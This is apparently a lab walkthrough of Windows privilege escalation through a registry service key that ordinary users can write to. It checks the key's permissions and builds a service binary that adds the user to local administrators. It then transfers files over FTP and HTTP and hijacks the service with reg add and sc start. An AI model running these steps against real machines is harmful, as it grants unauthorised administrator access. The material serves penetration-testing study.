#Windows #PrivEsc #Registry #SimpleHTTPServer #gcc-mingw-w64 #regsvc #pyftpdlib #SimpleHTTPServer #x86_64-w64-mingw32-gcc #sc 

﻿## **Detection**

Windows VM

1. Open PowerShell prompt and type: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
2. Notice that the output suggests that user belong to “`NT AUTHORITY\INTERACTIVE`” has “`FullContol`” permission over the registry key.

**Exploitation**

Windows VM

1. Copy ‘`C:\Users\User\Desktop\Tools\Source\windows_service.c`’ to the Kali VM.
	- Create a python ftp server on LHOST using `pyftpdlib`
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m pyftpdlib -p 21 --write       
/usr/lib/python3/dist-packages/pyftpdlib/authorizers.py:108: RuntimeWarning: write permissions assigned to anonymous user.
  self._check_permissions(username, perm)
[I 2024-10-07 20:22:14] concurrency model: async
[I 2024-10-07 20:22:14] masquerade (NAT) address: None
[I 2024-10-07 20:22:14] passive ports: None
[I 2024-10-07 20:22:14] >>> starting FTP server on 0.0.0.0:21, pid=659525 <<<
```
- Transfer file from RHOST to LHOST - with `cmd.exe` in directory of file to transfer to LHOST:
```
... [Windows RHOST as user]

> ftp [LHOST IP - Kali VM]

ftp> anonymous:anonymous

ftp> put windows_service.c

... [Kali VM - ftp server] ...

[I 2024-10-07 20:25:59] 10.10.59.8:49231-[anonymous] USER 'anonymous' logged in.
[I 2024-10-07 20:26:07] 10.10.59.8:49231-[anonymous] STOR /root/Downloads/windows_service.c completed=1 bytes=2043 seconds=0.497
```

Kali VM

1. Open `windows_service.c` in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`  
2. Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
		*(NOTE: if this is not installed, use '`sudo apt install gcc-mingw-w64`')* 
3. Copy the generated file `x.exe`, to the Windows VM.
- Using same `pyftpdlib`  and using `get` gave me error 193. But when I used `SimpleHTTPServer`, it transferred and the privesc worked!
```
┌──(root㉿kali)-[~/Downloads]
└─# python -m SimpleHTTPServer 80 
Serving HTTP on 0.0.0.0 port 80 ...
10.10.59.8 - - [07/Oct/2024 20:40:41] "GET / HTTP/1.1" 200 -
10.10.59.8 - - [07/Oct/2024 20:40:42] code 404, message File not found
10.10.59.8 - - [07/Oct/2024 20:40:42] "GET /favicon.ico HTTP/1.1" 404 -
10.10.59.8 - - [07/Oct/2024 20:40:46] "GET /x.exe HTTP/1.1" 200 -
```
- Navigate to LHOST IP from RHOST browser to download the `x.exe`

Windows VM

1. Place `x.exe` in ‘`C:\Temp`’. 
2. Open command prompt at type: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`  
3. In the command prompt type: `sc start regsvc`  
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

